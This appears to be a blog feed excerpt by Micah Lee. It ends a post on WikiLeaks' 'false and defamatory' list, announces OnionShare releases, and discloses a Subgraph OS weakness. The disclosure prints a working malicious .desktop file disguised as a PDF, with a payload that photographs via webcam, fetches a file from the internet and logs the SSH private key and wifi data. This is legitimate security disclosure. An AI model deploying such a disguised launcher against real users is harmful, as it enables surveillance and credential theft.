&lt;p&gt;Worse was to come. The &lt;a href="http://www.indexoncensorship.org/2011/02/wikileaks-belarus-and-israel-shamir/"&gt;NGO Index on Censorship&lt;/a&gt; sent a string of questions and some photographic evidence, suggesting Shamir had given the cables to Alexander Lukashenko of Belarus, Europe’s last dictator. Shamir had written a pro-Belarus article, shortly before photos emerged of him leaving the interior ministry. The day after, Belarus’s dictator gave a speech saying he was establishing a WikiLeaks for Belarus, citing some stories and information appearing in the genuine (and then unpublished) cables.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;With that in mind, check out these next items on the WikiLeaks censorship list:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange shared documents with a dictator.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange or WikiLeaks ever employed, or contracted, a holocaust denier.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Assuming James Ball is telling the truth, then both of those are lies.&lt;/p&gt;
&lt;p&gt;That's still not all. In August 2017, Assange welcomed (now former) pro-Putin Rep. Dana Rohrabacher (R-California) and Holocaust-denying alt-right icon Chuck Johnson to visit him in the Ecuadorian Embassy in London, &lt;a href="https://dailycaller.com/2017/08/16/exclusive-republican-congressman-meets-with-wikileaks-founder-julian-assange/"&gt;according to&lt;/a&gt; the Daily Caller. They were hoping to negotiate some sort of deal with Trump, but former White House Chief of Staff John Kelly &lt;a href="https://theintercept.com/2018/02/14/dana-rohrabacher-trump-russia-wikileaks-julian-assange/"&gt;prevented&lt;/a&gt; Rohrabacher from later briefing Trump about the meeting.&lt;/p&gt;
&lt;p&gt;After Assange's role in the 2016 election, David Duke, former grand wizard of the Ku Klux Klan, personally &lt;a href="https://twitter.com/DrDavidDuke/status/796263508124037120"&gt;thanked&lt;/a&gt; Assange.&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-davidduke.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Assange still, to this day, hasn't disavowed this sort of support from neo-Nazis or members of the KKK.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange is “far left’ or “far right”.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;While again, this is subjective and nuanced, "far right" is a fairly accurate description of Assange. Or, at least, "allied with the far right."&lt;/p&gt;
&lt;h3 id="perfect-record"&gt;Perfect record&lt;/h3&gt;&lt;p&gt;There's one item on the list that stood out for because it was actually true.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks does not have a perfect record of accurately verifying its publications.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As far as I can tell, WikiLeaks does indeed have a perfect record of publishing real, and often times very newsworthy, document sets on their website.&lt;/p&gt;
&lt;p&gt;WikiLeaks seems to keep its lies and conspiracy theories off of wikileaks.org (with the exception of our.wikileaks.org). Instead, WikiLeaks prefers to spread its misinformation on Twitter, in interviews, and on rambling screeds posted to Pastebin.&lt;/p&gt;
&lt;h4 id="update-january-11-2019"&gt;Update January 11, 2019:&lt;/h4&gt;&lt;p&gt;Someone pointed out a few WikiLeaks conspiracy theory tweets that I didn't know about.&lt;/p&gt;
&lt;p&gt;WikiLeaks &lt;a href="https://twitter.com/wikileaks/status/794450623404113920?lang=en"&gt;tweeted&lt;/a&gt; an article, written by white supremacist and alt-right icon Cassandra Fairbanks, that promoted the "John Podesta engaged in satanic rituals" conspiracy theory, making this item on the censorship list contain at least two lies:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange has ever published, uttered or tried to promote alleged conspiracy theories claiming “John Podesta engaged in satanic rituals”, the “Democratic Party had Seth Rich Killed”, “Clinton wore earpieces to the 2016 US election debates”, on “Clinton’s health” or “Clinton kidnapping children”.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-satanic.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;In order to promote the Pizzagate conspiracy, WikiLeaks &lt;a href="https://twitter.com/wikileaks/status/821595404500430848?lang=en"&gt;tweeted&lt;/a&gt; a Ben Swann video segment (which appears to now be taken down) about Pizzagate.&lt;/p&gt;
&lt;p&gt;(Wikipedia &lt;a href="https://en.wikipedia.org/wiki/Ben_Swann"&gt;says&lt;/a&gt; Swann "created the series, Reality Check, which he used to espouse conspiracy theories, such as Pizzagate, and those surrounding the Aurora, Colorado and Sandy Hook Elementary School shootings and the 9/11 attacks," and, "He was forced by his employer to bring down the internet media channel and most of his social media sites in 2017. He was fired in 2018 from CBS affiliate WGCL-TV in Atlanta, Georgia for pursuing his Reality Check show and alt-right theories, particularly Pizzagate.")&lt;/p&gt;
&lt;p&gt;As a bonus, they also included a handy link to an FBI document describing pedophile symbols, for all their Pizzagate followers. Which just adds the lies already discussed above in these items:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that Julian Assange or WikiLeaks promoted or invented the “pizzagate” conspiracy theory.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It is false and defamatory to suggest that WikiLeaks or Julian Assange has ever published, uttered or tried to promote a “conspiracy theory”.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-pizzagate.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;WikiLeaks &lt;a href="https://twitter.com/wikileaks/status/782906224937410562"&gt;tweeted&lt;/a&gt; a report from the right-wing fake news website TruePundit claiming that Hillary Clinton said, "Can't we just drone the guy?" about Assange. But they didn't just tweet it. As the Daily Kos &lt;a href="https://www.dailykos.com/stories/2016/11/2/1590342/--True-Pundit-and-Drone-this-Guy-A-brief-update-from-the-conspiracy-theory-machine-factory"&gt;describes&lt;/a&gt;, "Heck, Wikileaks tweeted it in monospace font with yellow highlight! That means it’s from some leaked document, right? Well, actually, Wikileaks put text from a right-wing website, TruePundit, in monospace font and highlighted the relevant quote." (Snopes &lt;a href="https://www.snopes.com/fact-check/julian-assange-drone-strike/"&gt;says&lt;/a&gt; Clinton calling for a drone strike against Assange is "unproven.")&lt;/p&gt;
&lt;p&gt;I'm not sure what items on the censorship list this one relates to. But in any case, they clearly don't have a problem with promoting misinformation and fake news if the message is right.&lt;/p&gt;
&lt;p&gt;&lt;img src="wikileaks-fakenews.png" alt=""&gt;&lt;/p&gt;
</content></entry><entry><title>Do you want to contribute to the next major version of OnionShare?</title><link href="https://micahflee.com/2018/12/do-you-want-to-contribute-to-the-next-major-version-of-onionshare/" rel="alternate"></link><updated>2018-12-22T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:bed88ac2-6a85-3ca0-9302-bedbc040f16b</id><content type="html">&lt;p&gt;&lt;a href="https://onionshare.org/"&gt;OnionShare&lt;/a&gt; lets you securely and anonymously send and receive files. It works by starting a web server, making it accessible as a Tor onion service, and generating an unguessable web address so others can download files from you, or upload files to you. It does &lt;em&gt;not&lt;/em&gt; require setting up a separate server or using a third party file-sharing service.&lt;/p&gt;
&lt;p&gt;Over the last 10 months volunteer developers, designers, translators, and I have been hard at work on OnionShare 2.0, and it’s nearly ready. If you’d like to chip in during the month or so before the final release, &lt;strong&gt;try out the &lt;a href="https://github.com/micahflee/onionshare/releases/tag/v2.0.dev2"&gt;latest development version&lt;/a&gt; and report any bugs&lt;/strong&gt;. The best way to report bugs is by &lt;a href="https://github.com/micahflee/onionshare/issues/new"&gt;opening an issue&lt;/a&gt; on GitHub and describing the problem, or you can send me an email at micah@micahflee.com if you don’t have a GitHub account.&lt;/p&gt;
&lt;p&gt;And if you are a native speaker of a language other than English, &lt;strong&gt;we can use your help making OnionShare available in your language&lt;/strong&gt;. If you’d like to help, check out the &lt;a href="https://github.com/micahflee/onionshare/wiki/Translating"&gt;wiki page&lt;/a&gt; about translating, and go make a &lt;a href="https://hosted.weblate.org/projects/onionshare/translations/"&gt;Weblate account&lt;/a&gt; to start translating the English strings into your native language. To give translators time to work we’re waiting about a month to release the final version. (OnionShare has supported multiple languages for a long time, but only in an unusable, half-assed kind of way. If you used a non-English language, only like 30% of OnionShare would appear in your language (if it was supported at all), and most was just displayed in English. The translation workflow was really bad: translators, many of whom aren’t programmers, had to submit pull requests on GitHub. It’s much better now.)&lt;/p&gt;
&lt;p&gt;This version of OnionShare is loaded with new features. I’ll go into them all in more detail once it’s finally released, but here’s what you should know about a few of them.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Receive mode:&lt;/strong&gt; Instead of just using OnionShare to send files to others, you can now use it as an anonymous dropbox of your own. Open OnionShare, switch to the “Receive Files” tab, and click start. After it finishes creating a Tor onion service, give the URL to other people. When they load it in Tor Browser, they’ll be able to &lt;em&gt;upload&lt;/em&gt; files directly to your computer. (Be careful: all the same warnings about malicious email attachments apply here. Don’t open random files from strangers unless you know what you’re doing, because they could try to hack your computer.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Support for next generation (v3) onion service:&lt;/strong&gt; OnionShare 2.0 finally supports the &lt;strong&gt;new, more secure, type of Tor onion services&lt;/strong&gt;. This was tricky to get working, and it actually involved discovering two separate bugs in upstream Tor (&lt;a href="https://trac.torproject.org/projects/tor/ticket/25552"&gt;this&lt;/a&gt; and &lt;a href="https://trac.torproject.org/projects/tor/ticket/28619"&gt;this&lt;/a&gt;). v3 onion services are only supported if you’re using the very latest development release of Tor. The Windows and Mac versions of OnionShare 2.0 will bundle a version of Tor that supports them. If you want to try them in this dev release you’ll need to configure OnionShare to connect to a &lt;a href="https://github.com/micahflee/onionshare/wiki/Connecting-to-Tor#using-a-system-tor-in-linux"&gt;system Tor&lt;/a&gt;, and install at least Tor 0.4.0.0, which Debian-like users can get from the Tor nightly-master &lt;a href="https://www.torproject.org/docs/debian.html.en"&gt;repository&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The final version of OnionShare 2.0 will probably be released in late January or early February 2019.&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-receive-client.png" alt="OnionShare&amp;#39;s new receive mode feature"&gt;&lt;/p&gt;
</content></entry><entry><title>OnionShare has some exciting new features</title><link href="https://micahflee.com/2018/02/onionshare-has-some-exciting-new-features/" rel="alternate"></link><updated>2018-02-26T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:1a46acec-285d-3513-b27a-2f1874f268fe</id><content type="html">&lt;p&gt;It’s been some time since I’ve written about OnionShare, so I thought I’d write an update on all of the latest work. Today we released version 1.3 (and last month we released 1.2, so the releases are getting more frequent). You can get the latest version at onionshare.org.&lt;/p&gt;
&lt;p&gt;But first, I owe a huge thanks to &lt;a href="https://twitter.com/_mig5"&gt;Miguel Jacq&lt;/a&gt; for churning out new features, taking over a lot of the GitHub issue triaging responsibilities, and becoming a core OnionShare developer.&lt;/p&gt;
&lt;p&gt;If you haven’t tried it out in awhile, here are some things that are new:&lt;/p&gt;
&lt;p&gt;The user interface has a &lt;em&gt;major&lt;/em&gt; upgrade. It’s now much more clear exactly what steps you’re supposed to take at every point, and it looks a bit more like a modern piece of software. In addition to the OnionShare interface getting redesigned, the client-side web interface — what people receiving the files with Tor Browser see — also has a new look:&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-client.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;(That’s Tor Browser running in a disposable Whonix AppVM in Qubes, by the way.)&lt;/p&gt;
&lt;p&gt;I owe a huge thanks to &lt;a href="https://keybase.io/glennsorrentino"&gt;Glenn Sorrentino&lt;/a&gt; for, nine months ago, doing a formal user study of OnionShare users and designing a brand new user experience that only now, in version 1.3, is seeing the light of day. Glenn also redesigned the onionshare.org website!&lt;/p&gt;
&lt;p&gt;OnionShare now bundles a copy of Tor with it (and has since May 2017), which means there’s no need to have Tor Browser open in the background anymore. Instead, OnionShare connects to Tor itself.&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-bundled-tor.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Because OnionShare can now control its own Tor process, it’s now also possible for censored users in countries like China to connect to the Tor network using bridges, from within OnionShare. Bridge support was first added last month, and support for meek bridges was added to 1.3 (for Linux only at the moment).&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-bridges.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Here’s more information about how to &lt;a href="https://github.com/micahflee/onionshare/wiki/Connecting-to-Tor"&gt;connect to Tor&lt;/a&gt;, and &lt;a href="https://github.com/micahflee/onionshare/wiki/Using-Bridges"&gt;using bridges&lt;/a&gt;, in OnionShare.&lt;/p&gt;
&lt;p&gt;Another recent feature is the auto-stop timer. Already, OnionShare will stop the share as soon as the first download finishes (you can disable this in the settings if you want to send files to multiple people). But now, if the receiver doesn’t download the file after a specified amount of time, OnionShare will automatically stop sharing for you. For example, here I’m sharing a screenshot, but the share will automatically stop at 2pm:&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-autostop1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Once you start the share, you can see a countdown of seconds remaining before it stops on its own. (If the receiver starts downloading before that countdown finishes though, they’ll be able to finish downloading all the files no matter how long the download takes.)&lt;/p&gt;
&lt;p&gt;&lt;img src="onionshare-autostop2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Here’s more information about &lt;a href="https://github.com/micahflee/onionshare/wiki/Using-the-Auto-Stop-Timer"&gt;using the auto-stop timer&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Another feature is persistent OnionShare addresses. By default, every time you share something, OnionShare generates a brand new URL, and soon as you’re done sharing it that URL no longer exists, and never will exist again. But now, you can change a setting that will allow you to re-use the same OnionShare URL for multiple shares.&lt;/p&gt;
&lt;p&gt;This might come in handy in any situation where you want to send someone files, but you don’t want to have any online communication channel with them. For example, let’s say a whistleblower (Alice) meets a journalist (Bob) in person. Alice can hand Bob a piece of paper with an OnionShare address on it and tell him to check it every night at a specific time. Now, Alice can continually anonymously send files to Bob without needing to communicate new OnionShare addresses every time. Here’s more information about &lt;a href="https://github.com/micahflee/onionshare/wiki/Using-a-Persistent-URL"&gt;persistent addresses&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Another advanced feature that’s been added is support for stealth, or authenticated, onion services. These are Tor onion services that are much more private, but are also harder to use. The sender needs to share both the OnionShare address but also a HidServAuth string, and the receiver needs to add this HidServAuth string to their torrc file before they’ll be able to connect to it. (This is why it’s an advanced feature, it’s not quite practical for beginners to do this without a lot of troubleshooting.) Here’s more information about using &lt;a href="https://github.com/micahflee/onionshare/wiki/Stealth-Onion-Services"&gt;stealth onions&lt;/a&gt; in OnionShare.&lt;/p&gt;
&lt;p&gt;On a similar note, you might be wondering about OnionShare support for next generation Tor onion services, which are more secure and private than existing onion services. There is an &lt;a href="https://github.com/micahflee/onionshare/issues/461"&gt;open issue&lt;/a&gt; for this, but currently it’s blocked until an upstream project that OnionShare relies on, &lt;a href="https://stem.torproject.org/"&gt;stem&lt;/a&gt;, adds support for ephemeral next gen onion services itself. However, the OnionShare website itself is now accessible using a next gen onion service, and OnionShare will load it to check for available updates:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://lldan5gahapx5k7iafb3s4ikijc4ni7gx5iywdflkba5y2ezyg6sjgyd.onion/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I’ve described some of the newest and biggest features in OnionShare, but it’s not nearly an exhaustive list. There are many more, including a system tray icon with desktop notifications, the ability to cancel shares before they finish starting, translations into several languages, checking for updates automatically, among others. Oh, and since January 2017, OnionShare has been &lt;a href="https://tails.boum.org/doc/anonymous_internet/onionshare/index.en.html"&gt;built-in to the Tails operating system&lt;/a&gt; too!&lt;/p&gt;
&lt;p&gt;I’m striving to make OnionShare a contributor-friendly open source project. Pull requests are always welcome, and in fact &lt;a href="https://github.com/micahflee/onionshare/graphs/contributors"&gt;51 different people&lt;/a&gt; have already contributed code.&lt;/p&gt;
&lt;p&gt;If you’d like to get involved in OnionShare development:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Read the &lt;a href="https://github.com/micahflee/onionshare/wiki/Developing-OnionShare"&gt;Developing OnionShare&lt;/a&gt; page on the wiki&lt;/li&gt;
&lt;li&gt;Join the new (and so far extremely low-traffic) &lt;a href="https://lists.riseup.net/www/subscribe/onionshare-dev"&gt;mailing list&lt;/a&gt; for OnionShare developers and designers&lt;/li&gt;
&lt;li&gt;Checkout the GitHub &lt;a href="https://github.com/micahflee/onionshare/issues"&gt;issues page&lt;/a&gt; for bugs or enhancements to work on, or open your own issues if there are features you’d like to develop&lt;/li&gt;
&lt;/ul&gt;
</content></entry><entry><title>Breaking the Security Model of Subgraph OS</title><link href="https://micahflee.com/2017/04/breaking-the-security-model-of-subgraph-os/" rel="alternate"></link><updated>2017-04-11T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:c1c45e6b-e936-3b21-a7bd-e2da53d5d9c1</id><content type="html">&lt;p&gt;I recently traveled to Amsterdam to attend a meeting with Tor Project staff, volunteers, and other members of the wider Tor community. Before trips like this, I prepare a separate travel computer, only bringing with me data and credentials that I might need during my trip. My primary laptop runs &lt;a href="https://www.qubes-os.org/"&gt;Qubes&lt;/a&gt;, but this time I decided to install &lt;a href="https://subgraph.com/sgos/index.en.html"&gt;Subgraph OS&lt;/a&gt; on my travel laptop. I had only briefly messed with it before, and there’s no better way to learn about a new operating system than by forcing yourself to actually use it for a few days.&lt;/p&gt;
&lt;p&gt;Subgraph OS is an “adversary resistant computing platform.” It’s similar to &lt;a href="https://tails.boum.org/"&gt;Tails&lt;/a&gt; in that it’s based on Debian and all traffic is forced through Tor (that’s changing though: there’s now basic support for &lt;a href="https://subgraph.com/sgos/documentation/clearnet-chromium/"&gt;clearnet Chromium&lt;/a&gt; and &lt;a href="https://twitter.com/subgraph/status/846455144648785921"&gt;OpenVPN&lt;/a&gt;). It uses a grsecurity Linux kernel, and many apps run in “oz sandboxes”, a homebrew sandbox solution that protects you even if an attacker manages to exploit a bug in one of these apps. Subgraph OS also includes the Subgraph Firewall, an application firewall similar to Little Snitch for macOS — something that’s pretty awesome, and hasn’t really existed in the Linux ecosystem before. Basically, it’s designed to be an easy-to-use Linux distro that’s extremely secure.&lt;/p&gt;
&lt;p&gt;Joanna Rutkowska, the brains behind Qubes, was at the Tor meeting as well. We sat down together and started poking at Subgraph OS to see if we could break its security model, and we succeeded! After we discovered weaknesses, I polished them into a working exploit.&lt;/p&gt;
&lt;iframe src="https://www.youtube-nocookie.com/embed/SVsllZ7g7-I?rel=0" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"&gt;&lt;/iframe&gt;&lt;p&gt;Subgraph publishes a user manual called the Subgraph OS Handbook. You can find the code for it &lt;a href="https://github.com/subgraph/sgos_handbook"&gt;on GitHub&lt;/a&gt;. I made a fake website with a link to download this git repository, compressed as a zip file. A realistic targeted attack would probably use different bait — perhaps an attacker would send a journalist some juicy documents — but the point is, the user downloads something from a website, or maybe from their email, and then double-clicks a document to open it. Subgraph OS, with its grsecurity Linux kernel and oz sandboxes, is supposed to prevent malicious documents from taking over your computer, but in this case it doesn’t.&lt;/p&gt;
&lt;p&gt;I reported what we found to the Subgraph developers and offered to give them time to resolve the issues before I published this post. They said that none of what I reported was surprising, that Subgraph OS is still in alpha, and that they don’t recommend that people use it yet. But that’s funny, because &lt;a href="https://archive.is/A1OCP"&gt;their website&lt;/a&gt; doesn’t seem to include that warning — it describes a list of amazing security features, ending with, “Try the Subgraph OS Alpha today. You can install it on a computer, run it as a live-disk, or use it in a VM.”&lt;/p&gt;
&lt;p&gt;They didn’t ask for more time, and they haven’t resolved the issues yet.&lt;/p&gt;
&lt;p&gt;To be fair, Subgraph OS &lt;em&gt;is&lt;/em&gt; still in alpha, and already it’s more secure by default than many other Linux distros. This same attack also works against Tails, Debian, Ubuntu, Fedora, Arch, etc. (not Qubes though).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How oz sandboxing works&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Subgraph comes with sandboxes for 22 applications — things like Tor Browser, OnionShare, Evince (PDF reader), Eye of GNOME (image viewer), Icedove (email client), and VLC (media player). If you run a program that doesn’t have an oz sandbox (such as Nautilus, the built-in file manager, or anything that isn’t one of those 22 programs), then it runs unsandboxed, with access to all your user data.&lt;/p&gt;
&lt;p&gt;If you open a malicious PDF that exploits a bug in Evince, the sandbox will limit what the attacker can do. It blocks internet access, so the attacker can’t phone home. It restricts what Linux system calls can be made to only what evince needs to work. It limits access to the filesystem. On a normal Linux computer, if an attacker hacks Evince, they can access all of the user’s data in their home directory (documents, email, PGP and SSH keys, etc.), but the Evince oz sandbox prevents the attacker from accessing any documents except the one that the user opened.&lt;/p&gt;
&lt;p&gt;Oz sandboxes themselves seem pretty good at a glance. Though I did find some information leakage. I discovered that /etc is readable. So if you run ls /etc/NetworkManager/system-connections, you can see a list of the computer’s saved wifi networks, even within the sandbox. In oz sandboxes that allow internet access (like the Tor Browser one), this information could be sent back to the attacker — there’s likely other juicy data in there too. When I reported this, the Subgraph devs pointed me to &lt;a href="https://github.com/subgraph/oz/issues/20"&gt;this year-old github issue&lt;/a&gt;, showing that they’ve thought about it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;The problem with Subgraph OS’s sandbox approach&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Oz sandboxes are similar to &lt;a href="https://developer.apple.com/library/content/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html"&gt;macOS app sandboxes&lt;/a&gt; — they lock down what specific apps can do so that if those apps get hacked, the attacker is hopefully stuck in the sandbox with very limited access. While this is great, it’s an incomplete solution to endpoint security.&lt;/p&gt;
&lt;p&gt;For one thing, most of the programs you run in Subgraph &lt;em&gt;aren’t&lt;/em&gt; sandboxed. Most of GNOME isn’t. Nautilus, the graphical file manager, isn’t, and neither is the terminal app. If an attacker can trick a user into running an unsandboxed script in either Nautilus (what my attack does) or in the terminal, it’s game over. If the user installs custom software that doesn’t have an oz profile, and an attacker exploits this software, it’s also game over.&lt;/p&gt;
&lt;p&gt;An attacker that gets unsandboxed remote code execution in Subgraph OS has a lot of access. They can see, and exfiltrate, all of the user’s data: PGP keys, SSH keys, stored email, documents, password databases, and everything else. They can listen from the microphone and watch through the webcam. They can learn the network interface’s MAC address, and see nearby wifi access points and bluetooth devices, which can be used to deanonymize the user. They can install a persistent backdoor in your computer.&lt;/p&gt;
&lt;p&gt;For another, there’s no way to compartmentalize different parts of your computer for different purposes like you can in Qubes. You can’t make a separate sandbox for working with some untrusted documents, or for keeping certain secrets extra secure, or for managing different anonymous identities online. All of your data in Subgraph OS, at some point, risks getting accessed by unsandboxed programs.&lt;/p&gt;
&lt;p&gt;I won’t go into detail about how Qubes does it except to say that it’s a somewhat opposite approach. You have a thin, unsandboxed layer that has total control over your computer, and then &lt;em&gt;everything&lt;/em&gt; else is run inside of sandboxes. Qubes also protects sandboxed apps from reading potentially sensitive data off of your clipboard (unless you want it to), and it protects your administrative domain from untrusted input coming from your network drivers and your USB stack. (It’s the only operating system that I’m aware of that, out-of-the-box, protects against BadUSB attacks.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hacking the Free Desktop with .desktop files&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In the free desktop world, application launchers are .desktop files. Every GUI application on your Linux box has a desktop file, just check &lt;code&gt;/usr/share/applications&lt;/code&gt;. If you’re creating a custom application launcher, inside the .desktop file you specify the name of the application, an icon, as well as what to run when you execute it.&lt;/p&gt;
&lt;p&gt;If you open Nautilus and browse to a folder with a .desktop file in it, there are two ways it can get displayed.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the file isn’t executable, Nautilus doesn’t trust it and shows the full original filename, including the .desktop extension, and a default icon.&lt;/li&gt;
&lt;li&gt;If the file is executable, Nautilus trusts it and shows whatever name and icon is specified in the file. This is why the exploit I built was zipped up, so I could ensure that my malicious .desktop file is executable.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It’s important to note that this is a &lt;em&gt;huge gaping security hole in Nautilus&lt;/em&gt;. All Linux users that use Nautilus (including everyone who uses GNOME, Unity, Cinnamon) are vulnerable to getting tricked this way. This bug was &lt;a href="https://bugzilla.gnome.org/show_bug.cgi?id=777991"&gt;reported to Nautilus&lt;/a&gt; in January, and it has now been resolved (by, I believe, popping up a warning asking if you trust the source of the desktop launcher before executing it), but the fix won’t be released until Nautilus 3.24.&lt;/p&gt;
&lt;p&gt;Debian Stretch ships 3.22.3; Fedora 25 ships 3.22.2; Ubuntu 16.10 ships 3.20.3; Ubuntu 17.04 ships 3.20.4. So it might be some time before this fix actually makes it into distros that people use. The Subgraph devs pointed me to &lt;a href="https://github.com/subgraph/subgraph-os-issues/issues/227"&gt;this recent github issue&lt;/a&gt;, showing that they’ve thought about this issue too. They also said they’re planning on auditing the Nautilus source code.&lt;/p&gt;
&lt;p&gt;The exploit I created is a file called &lt;code&gt;sgos_handbook.pdf.desktop&lt;/code&gt; (though I could have named it &lt;code&gt;malware.desktop&lt;/code&gt; and it would have looked the same in Nautilus). Here’s what’s inside of it. Note that the name is set to &lt;code&gt;sgos_handbook.pdf&lt;/code&gt;, and the icon is &lt;code&gt;gnome-mime-application-pdf&lt;/code&gt; which is the default icon for PDFs in Subgraph — these two things make it so you can’t tell that this isn’t a PDF when viewing it in Nautilus. Also, of course, note that it’s set to execute a malicious shell script when it’s run.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env xdg-open
[Desktop Entry]
Encoding=UTF-8
Name=sgos_handbook.pdf
Exec=sh -c 'ROOT=$(dirname $(dirname $(find $HOME -type f -name sgos_handbook.pdf.desktop)) |head -n1); evince $ROOT/static/sgos_handbook.pdf; mkdir $HOME/.config/tools; cd $HOME/.config/tools; torify apt download fswebcam; dpkg-deb -xv `ls fswebcam_*.deb` .; ./usr/bin/fswebcam -r 640x480 $HOME/webcam-snapshot.jpg; torify wget https://static.wixstatic.com/media/6a4a49_4e03bc224328475ea2e20dddaf9d0fda~mv2_d_2121_1414_s_2.jpg -O $HOME/attacker-can-drop-files-from-the-internet.jpg; echo "ifconfig output:" &amp;gt;&amp;gt; $HOME/pwnlog.txt; /sbin/ifconfig &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo "tor exit node info:" &amp;gt;&amp;gt; $HOME/pwnlog.txt; torify curl https://ifconfig.co/json &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo "ssh public and secret keys:" &amp;gt;&amp;gt; $HOME/pwnlog.txt; cat $HOME/.ssh/id_rsa.pub &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo &amp;gt;&amp;gt; $HOME/pwnlog.txt; cat $HOME/.ssh/id_rsa &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo "nearby wifi:" &amp;gt;&amp;gt; $HOME/pwnlog.txt; /sbin/iwlist $INTERFACE scan &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo "saved wifi networks:" &amp;gt;&amp;gt; $HOME/pwnlog.txt; ls /etc/NetworkManager/system-connections &amp;gt;&amp;gt; $HOME/pwnlog.txt; echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;'
Terminal=false
Type=Application
Icon=gnome-mime-application-pdf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here’s a more human-readable, and commented, version of the payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-sh"&gt;#!/bin/sh

# Find the location of the extracted sgos_handbook folder
ROOT=$(dirname $(dirname $(find $HOME -type f -name sgos_handbook.pdf.desktop)) |head -n1);

# Open the actual PDF in an oz sandbox
evince $ROOT/static/sgos_handbook.pdf;

# Take a snapshot from the webcam
mkdir $HOME/.config/tools;
cd $HOME/.config/tools;
torify apt download fswebcam;
dpkg-deb -xv `ls fswebcam_*.deb` .;
./usr/bin/fswebcam -r 640x480 $HOME/webcam-snapshot.jpg;

# Download an image to the home directory
torify wget https://static.wixstatic.com/media/6a4a49_4e03bc224328475ea2e20dddaf9d0fda~mv2_d_2121_1414_s_2.jpg -O $HOME/attacker-can-drop-files-from-the-internet.jpg;

# Log the ifconfig output, which includes the MAC address
echo &amp;quot;ifconfig output:&amp;quot; &amp;gt;&amp;gt; $HOME/pwnlog.txt;
/sbin/ifconfig &amp;gt;&amp;gt; $HOME/pwnlog.txt;
echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;

# Log information about the current Tor exit node
echo &amp;quot;tor exit node info:&amp;quot; &amp;gt;&amp;gt; $HOME/pwnlog.txt;
torify curl https://ifconfig.co/json &amp;gt;&amp;gt; $HOME/pwnlog.txt;
echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;
echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;

# Log SSH public and secret key
echo &amp;quot;ssh public and secret keys:&amp;quot; &amp;gt;&amp;gt; $HOME/pwnlog.txt;
cat $HOME/.ssh/id_rsa.pub &amp;gt;&amp;gt; $HOME/pwnlog.txt;
echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;
cat $HOME/.ssh/id_rsa &amp;gt;&amp;gt; $HOME/pwnlog.txt;
echo &amp;gt;&amp;gt; $HOME/pwnlog.txt;

# Log scan of nearby wifi networks
echo &amp;quot;nearby wifi:&amp;quot; &amp;gt;&amp;gt; $HOME/pwnlog.txt;
/sbin/iwlist $INTERFACE scan &amp;gt;&amp;gt; $HOME/pwnlog.txt;
